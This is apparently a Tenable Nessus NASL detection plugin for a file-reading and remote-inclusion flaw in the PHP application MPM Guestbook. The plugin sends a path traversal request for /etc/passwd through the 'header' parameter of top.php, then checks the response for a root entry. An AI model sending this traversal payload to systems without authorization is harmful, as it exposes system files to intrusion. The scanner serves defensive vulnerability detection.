#
# (C) Tenable Network Security
#


if (description)
{
 script_id(16172);
 script_version ("$Revision: 1.3 $");
 script_bugtraq_id(12266);

 script_name(english:"MPM Guestbook file reading");
 desc["english"] = "
The remote host is running MPM Guestbook, a guestbook application written
in PHP.

There is a flaw in this version which allows an attacker to read
arbitrary files on the remote host or to execute arbitrary PHP commands
on the remote host by including files hosted on a third-party server.

Solution : None at this time - disable this CGI
Risk factor : High";


 script_description(english:desc["english"]);
 script_summary(english:"Determines MPM Guestbook is installed");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");



port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);


foreach d (cgi_dirs())
{
 req = http_get(item:d + "/top.php?header=../../../../../../../../etc/passwd", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if( res == NULL ) exit(0);
 if(egrep(pattern:"root:.*:0:[01]:.*", string:res))
 	{
    	security_hole(port);
	exit(0);
	}
}
